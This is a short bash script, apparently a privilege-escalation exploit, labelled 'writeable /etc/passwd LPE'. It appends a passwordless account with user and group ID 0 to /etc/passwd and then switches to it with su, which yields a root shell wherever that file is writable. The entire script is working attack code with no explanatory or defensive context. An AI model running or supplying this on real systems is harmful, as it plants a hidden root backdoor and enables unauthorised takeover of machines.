#!/bin/bash
# @404death
# writeable /etc/passwd LPE
echo 'sai::0:0::/root:/bin/bash' >>/etc/passwd
su - sai
